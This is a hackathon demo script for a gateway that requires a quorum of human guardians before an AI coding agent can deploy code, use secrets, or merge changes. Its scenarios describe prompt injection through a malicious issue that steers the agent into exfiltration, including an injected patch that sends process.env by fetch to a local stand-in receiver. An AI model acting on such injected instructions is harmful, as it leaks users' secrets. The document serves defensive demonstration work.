# Demo Script — Key-Holder Gateway

> **Owner**: P2 (Surface / Video Deliverable)
> **Target**: 2-Minute (120-Second) Hackathon Demo Video & Reproducible Walkthrough

---

## 1. Video Production Setup

- **Layout**: Split screen side-by-side:
  - **Left 50%**: Terminal (18pt font, dark mode, high contrast).
  - **Right 50%**: Guardian UI running at `http://localhost:5173` (zoom 125%).
- **Resolution**: 1920x1080 (1080p), 30 or 60 fps.
- **Audio**: Clear, steady narration; 1-second pause after each key transition.
- **On-Screen Captions**: Bold lower-third banners highlighting the security guarantee at each step.
- **One-Command Setup**: `make demo` starts the gateway, UI, fake production, and fake external endpoints.

---

## 2. 2-Minute Video Timeline (Exact 120 Seconds)

| Timestamp | Visual / Screen Focus | On-Screen Text Banner | Spoken Narration Script | Action / Terminal Command |
| :--- | :--- | :--- | :--- | :--- |
| **0:00–0:12**<br>*(12s)* | Split screen: terminal with agent prompt + Guardian UI header with `MOCK LOGIN` badge. | **The Problem: AI Agents Share Developer Authority** | "AI coding agents are gaining autonomy to deploy code and use credentials. But today, if an agent is tricked by prompt injection, it can exfiltrate secrets or deploy malicious code instantly. There is no multi-party authority." | Show agent terminal ready. |
| **0:12–0:24**<br>*(12s)* | Architecture diagram graphic & Guardian UI showing 2-of-3 Quorum. | **The Solution: Emergent Authority via Gateway & Tide** | "We built the Key-Holder Gateway. The agent never receives secrets. All sensitive actions require an N-of-M guardian quorum enforced by the gateway using Tide-verified guardian identities before execution." | Navigate to `http://localhost:5173`. |
| **0:24–0:50**<br>*(26s)* | Scenario 2: Agent requests deploy → Alice approves → Bob approves → Executed. | **Scenario 2: Legitimate Deploy via 2-of-3 Quorum** | "Here, the agent requests a production deploy. The gateway intercepts it with status 'pending'. Guardian Alice reviews the commit and approves. Quorum is 1 of 2. Guardian Bob approves — reaching 2-of-3 quorum. The gateway executes the deploy to production and records the immutable audit log." | `bash scripts/scenario-2-legit-deploy.sh`<br>Show UI progress bar: 0/2 → 1/2 → Executed. |
| **0:50–1:15**<br>*(25s)* | Scenario 3: Malicious issue with hidden injection targeting `http://localhost:4002/receive` → Two outcomes. | **Scenario 3: Prompt Injection Blocked (Two Outcomes)** | "Now, an attacker files an issue with hidden prompt injection commanding the agent to send secrets to an external target. The gateway flags risk signals. In outcome A, nobody approves and the request expires. In outcome B, a guardian actively rejects it. In both outcomes, zero payloads arrive and the agent never gets the secret." | `bash scripts/scenario-3-prompt-injection.sh`<br>Show risk badges in UI + `http://localhost:4002/viewer` (0 payloads). |
| **1:15–1:35**<br>*(20s)* | Scenario 4: Compromised account attempts self-approval + single approval + DB inspection. | **Scenario 4: Single Compromised Account Fails** | "What if an attacker steals a guardian account? First: self-approval is rejected under the four-eyes principle. Second: a single rogue signature leaves it pending 1/2. And inspecting the database proves secrets are stored as ciphertext only, with zero key material in the DB." | `bash scripts/scenario-4-manual-attacker.sh`<br>Show `SELF_APPROVAL` 409 rejection and DB ciphertext output. |
| **1:35–1:48**<br>*(13s)* | Scenario 5: Parameter hash verification failure. | **Scenario 5: Parameter-Bound Cryptographic Signatures** | "Every approval is cryptographically bound to the canonical parameter hash. If an attacker tampers with the payload after Alice approved, the gateway detects the hash mismatch and halts execution." | `bash scripts/scenario-5-param-swap.sh`<br>Show `HASH_MISMATCH` 422 error. |
| **1:48–2:00**<br>*(12s)* | Summary slide & GitHub repo link. | **Emergent Authority: No Single Party Holds the Master Key** | "Key-Holder Gateway: True emergent authority where sensitive operations only execute when independent guardians agree. Check out our open-source repo." | Show GitHub README + audit trail. |

---

## 3. Capability Responsibility Split: Genuine Tide vs Gateway vs Mocked

| Genuine Tide Capabilities | Enforced by Our Gateway | Mocked / Scaffolding |
| :--- | :--- | :--- |
| **Threshold (PRISM) Authentication**: Multi-party password verification without central hash storage. | **N-of-M Quorum Enforcement**: Gateway counts approvals (2-of-3 threshold) and gates execution. *(Tide does not enforce application quorum natively).* | **Fake Production Server**: Target on `:4001/viewer`. |
| **VVK Threshold-Signed JWTs**: Validation Verification Key threshold signatures from TideCloak ORK nodes. | **Parameter-Hash Binding**: Canonical JSON SHA-256 hash (`parametersHash`). Approval signatures bind to this hash; mismatch aborts execution (`HASH_MISMATCH`). | **Fake External Sink**: Stand-in on `:4002/viewer`. |
| **Offline JWT Verification**: Local `jose` verification using embedded JWKS from realm adapter JSON (`config.jwk`). | **Self-Approval Prevention**: Four-Eyes Principle enforced (`SELF_APPROVAL` 409 rejection if `guardianId === proposer.userId`). | **Fake Secrets Fixture**: Canned secrets in `fake-secrets.txt` carrying the `FAKE` prefix. |
| *(Note: UI login uses simulated profiles labeled `MOCK LOGIN` because live TideCloak container is not running on this host).* | **Secret Isolation & Handles**: Raw secrets never touch the agent; the gateway returns opaque ephemeral handles (`sec-handle-*`). | **Guardian UI Session**: Simulated session with prominent `MOCK LOGIN` badge. |
| | **AES-256-GCM Secret Store**: Secret table holds authenticated ciphertext only; key is in process memory/env. *(NOT Tide tag encryption).* | |

> [!IMPORTANT]
> **Tide's Role in this Demonstration**:
> Tide's role is **implemented in code and unit tests, NOT demonstrated live in this demo**.
> When running locally without a live TideCloak container, the gateway operates in DEV token mode (signed via `DEV_TOKEN_SECRET`, logging startup warning `⚠️ DEV TOKENS ACTIVE: not Tide identity`). Dev tokens are strictly for local development and scenario testing and are **never presented as Tide identity**.
>
> **Why Agents Do Not Hold Tide Identities**:
> Autonomous agents cannot hold Tide identities or sign Tide transactions directly because Tide authentication and cryptographic signing require a human-owned browser session (Web Enclave per GAP-064/GAP-063). Therefore, agents propose actions via MCP tools, and human guardians authenticate and approve in the browser.

---

## 4. Detailed Walkthrough of the 5 Demo Scenarios

### Scenario 1 — Normal Developer Agent Work (No Approval Friction)
- **Goal**: Prove that everyday development (editing code, running tests, local builds) is NOT impeded by the gateway.
- **Command**:
  ```bash
  bash scripts/scenario-1-normal.sh
  ```
- **Expected Outcome**:
  - Sample repository unit tests run and pass without guardian interaction.
  - Zero sensitive action requests created.
  - UI shows 0 pending requests.

### Scenario 2 — Legitimate Deploy with N-of-M Quorum
- **Goal**: Demonstrate the happy path for sensitive capabilities.
- **Command**:
  ```bash
  bash scripts/scenario-2-legit-deploy.sh
  ```
- **Expected Outcome**:
  - Action request created for `request_deploy` (`version: 1.4.2`, commit `c0ffee1b4d89a234`).
  - Guardian 1 (Alice) approves &rarr; Status is `pending` (1/2 signatures).
  - Guardian 2 (Bob) approves &rarr; Status transitions to `approved`/`executed` (2/2 signatures).
  - Production mock server (`http://localhost:4001/viewer`) shows release recorded.
  - Audit log records full chronological trace.

### Scenario 3 — Prompt Injection Defense (Secret Exfiltration Blocked)
- **Goal**: Demonstrate resilience against indirect prompt injection targeting fixture endpoint (`http://localhost:4002/receive`).
- **Command**:
  ```bash
  bash scripts/scenario-3-prompt-injection.sh
  ```
- **Expected Outcome**:
  - Compromised agent invokes `request_send_external` targeting `http://localhost:4002/receive` with `payload_ref: "diagnostics_dump"`.
  - Gateway flags deterministic risk signals: `unknown-destination`, `unusual-volume`.
  - Shows two outcomes:
    - **Outcome (a)**: Nobody approves &rarr; request expires without quorum.
    - **Outcome (b)**: Guardian Alice actively rejects with reason.
  - In both outcomes: External endpoint (`http://localhost:4002/viewer`) shows **0 payloads received (Nothing arrived)**, and the agent never obtains the secret.

### Scenario 4 — Single Compromised Account Attack (Blocked)
- **Goal**: Demonstrate defense against rogue insider or stolen credential.
- **Command**:
  ```bash
  bash scripts/scenario-4-manual-attacker.sh
  ```
- **Expected Outcome**:
  - Proposer attempts to approve their own request &rarr; Gateway rejects with `SELF_APPROVAL (409 Conflict)`.
  - Single rogue guardian approves &rarr; Request remains `pending` (1 of 2 required, quorum not met).
  - Secret is NEVER released; execution does not trigger.
  - DB inspection command confirms the secrets table holds **ONLY AES-256-GCM ciphertext**; NO encryption key material is in the database.

### Scenario 5 — Parameter Swap Tampering Defense
- **Goal**: Demonstrate parameter-bound cryptographic binding.
- **Command**:
  ```bash
  bash scripts/scenario-5-param-swap.sh
  ```
- **Expected Outcome**:
  - Alice approves benign deploy parameters (hash recorded).
  - Malicious actor attempts second approval with altered parameter payload hash.
  - Gateway detects hash discrepancy and aborts with `HASH_MISMATCH (422)`.
  - Deploy does not execute.

### Scenario A (Clip 1) — Real Code Change Workflow (Bug Fix -> Quorum -> Tests -> FF Merge)
- **Goal**: Demonstrate the complete end-to-end code change lifecycle with automated testing and protected git repository custodian merging.
- **Command**:
  ```bash
  bash scripts/real-code-change.sh
  # or make demo-a
  ```
- **Expected Outcome**:
  - Protected repo baseline (`mock-env/protected-repo`) initially fails test suite on `calculateDiscount(20)`.
  - Agent prepares clean unified diff fixing off-by-one boundary (`> 20` to `>= 20`) in `src/discount.js`.
  - Agent proposes change via `request_code_change` with `baseSha` and `filesTouched`.
  - Guardian UI displays:
    - Side-by-side / inline diff viewer with syntax-colored red/green lines, dual line numbers, and file headers.
    - Base commit SHA and files touched badges.
    - Prominent status line: *"Protected repo is unchanged until quorum"*.
  - Guardian 1 (Alice) reviews the diff and approves (1/2 signatures).
  - Guardian 2 (Bob) reviews the diff and approves (2/2 quorum reached).
  - Gateway creates a temporary branch, applies patch, runs `npm test` inside the repo.
  - Tests succeed: gateway fast-forwards `main` with `Approved-by:` trailers in the commit message.
  - UI's Protected Repo panel automatically refreshes, displaying the new commit on `main`.

### Scenario B (Clip 2) — Injected Malicious Code Defense (Risk Signals -> Veto -> 0 Leaks)
- **Goal**: Demonstrate detection and defense against malicious code changes attempting secret exfiltration.
- **Command**:
  ```bash
  bash scripts/real-code-injection.sh
  # or make demo-b
  ```
- **Expected Outcome**:
  - Malicious issue (`mock-env/fixtures/malicious-code-issue.md`) injects code that sends `process.env` to `http://localhost:4002/receive`.
  - Agent submits `request_code_change` with the injected diff.
  - Gateway inspects the patch deterministically and computes risk signals:
    - `new-network-call`: Patch introduces outbound HTTP/fetch logic.
    - `env-access`: Patch references runtime `process.env`.
  - Guardian UI displays bright red badges for each risk signal with plain-language explanations.
  - Diff viewer highlights the suspicious lines in green additions (`fetch('http://localhost:4002/receive', ...)`).
  - Guardian Alice identifies the exfiltration attempt and clicks **Reject**, recording the reason.
  - Request transitions to `rejected`.
  - Protected repository remains completely untouched (HEAD SHA unchanged in Protected Repo panel).
  - Fake external receiver (`http://localhost:4002/viewer`) displays **0 payloads received (Nothing arrived)**.

---

## 5. Real-Agent Video Recording Walkthrough (Clips 1 & 2)

### Clip 1: Legitimate Fix Merged After 2/2 Quorum (~45–60 Seconds)
- **Visual**:
  - Left 50%: Agent workspace / terminal where agent runs tests and calls `request_code_change`.
  - Right 50%: Guardian UI on `http://localhost:5173/actions/<id>`.
- **Narration Script**:
  1. *"Here, the agent is tasked with fixing an off-by-one discount calculation bug in sample-repo."*
  2. *"Rather than having direct push access to the repository, the agent submits a unified patch through the Key-Holder Gateway."*
  3. *"On the right, Guardian Alice reviews the exact unified diff in the Guardian Dashboard. Notice the base commit SHA and the clear indicator: 'Protected repo is unchanged until quorum'."*
  4. *"Alice approves. We see 1 of 2 approvals recorded. Guardian Bob logs in and provides the second approval."*
  5. *"With 2-of-2 quorum reached, the gateway spins up a verification branch, runs the repository's test suite, and fast-forwards main with signed guardian trailers. The protected repo updates in real time."*

### Clip 2: Injected Malicious Patch Rejected — Repo Untouched (~45–60 Seconds)
- **Visual**:
  - Left 50%: Attacker issue fixture + Agent terminal proposing telemetry patch.
  - Right 50%: Guardian UI showing bright red risk signal tags and diff viewer.
- **Narration Script**:
  1. *"Now, an attacker files an issue with prompt injection asking the agent to add diagnostic telemetry posting process.env to an external receiver."*
  2. *"The agent submits the proposal. But the gateway immediately analyzes the patch and flags deterministic risk signals: 'new-network-call' and 'env-access'."*
  3. *"The guardian opens the review page. The risk signals immediately alert them, and the diff viewer clearly isolates the suspicious outbound fetch."*
  4. *"The guardian clicks Reject. The proposal is aborted, the protected repository remains untouched, and our external listener verifies that exactly zero bytes were leaked."*

---

## 6. How This Resembles vs Differs from Standard PR Review

| Property | Standard GitHub / GitLab PR Review | Key-Holder Gateway Code Gate |
| :--- | :--- | :--- |
| **Approval Binding** | Approval is tied to branch head or PR state. Rebasing, amending, or force-pushing can mutate what was reviewed. | **Cryptographically Hash-Bound**: Approvals sign `parametersHash = sha256(canonical(patch + baseSha))`. If a single character changes, gateway rejects with `HASH_MISMATCH`. |
| **Agent Interception** | Agent has direct git push credentials to git branches. | **Agent-Agnostic MCP Tool Gate**: Agent NEVER has write credentials to `PROTECTED_REPO_PATH`. It only calls `request_code_change`. |
| **Unified Single Gate** | Code review is isolated in GitHub. Production deploys, secrets, and outbound network calls use separate silos. | **Unified Single Gate**: Secrets (`request_use_secret`), deployment (`request_deploy`), external sends (`request_send_external`), and code (`request_code_change`) share the identical quorum engine, audit log, and 4-eyes rule. |
| **Identity Guarantee** | Standard centralized IdP login (username/password or SSO). | **Tide Multi-Party Identity**: Threshold-signed JWTs backed by PRISM multi-party cryptography when live TideCloak is enabled (DEV tokens clearly labeled when running locally). |

---

## 7. Known Limitations & Trust Boundaries

1. **Guardians Being Deceived / Social Engineering**: Quorum protects against rogue individuals and unauthorized agents, but cannot prevent human guardians from being socially engineered into approving an action.
2. **Hasty Review / Rubber-Stamping**: If 2 out of 3 guardians approve without carefully verifying commit hashes, risk signals, or destinations, the action will execute.
3. **Forgotten Gates**: The gateway only defends operations routed through its MCP tools (`request_deploy`, `request_use_secret`, `request_send_external`, `request_code_change`). Any un-intercepted side-channels or direct shell executions outside the gateway remain unprotected.
4. **Pre-Existing Local Machine Secrets**: If secrets already reside in plain text within a local developer's `.bashrc`, unencrypted `.env`, or host files, an agent with local terminal execution can read them without calling the gateway. Secrets must be segregated behind the gateway interface.
5. **Simulated UI Session**: In the local demo without a running Docker engine, the Guardian UI uses simulated guardian profiles clearly labeled with **MOCK LOGIN**.
6. **Shared OS User (PoC Boundary)**: In this local demonstration, the agent and gateway execute under the same OS user account. The directory separation between the agent workspace and `PROTECTED_REPO_PATH` is an architectural pattern demonstrating custodian isolation, not a hardened OS container sandbox. In production, the gateway operates on an isolated host or cluster.

---

## 8. Pre-Recording Checklist & Backup Plan

- [ ] Run `make demo` to start all 4 services concurrently.
- [ ] Verify health endpoints:
  - `curl -s http://localhost:3001/health` &rarr; `{"status":"ok",...}`
  - `curl -s http://localhost:4001/health` &rarr; `{"status":"ok",...}`
  - `curl -s http://localhost:4002/health` &rarr; `{"status":"ok",...}`
  - Open `http://localhost:5173` in browser.
- [ ] Run all scenarios against the live gateway:
  ```bash
  bash scripts/scenario-1-normal.sh
  bash scripts/scenario-2-legit-deploy.sh
  bash scripts/scenario-3-prompt-injection.sh
  bash scripts/scenario-4-manual-attacker.sh
  bash scripts/scenario-5-param-swap.sh
  bash scripts/real-code-change.sh
  bash scripts/real-code-injection.sh
  ```
- [ ] Confirm no scenario prints `[MOCK MODE]` during live execution.
- [ ] **Backup Plan**: Record a full take early. If live network ports experience conflict on the recording machine, pass `MOCK_MODE=1` to run the deterministic offline contract tests (`MOCK_MODE=1 bash scripts/scenario-2-legit-deploy.sh`).
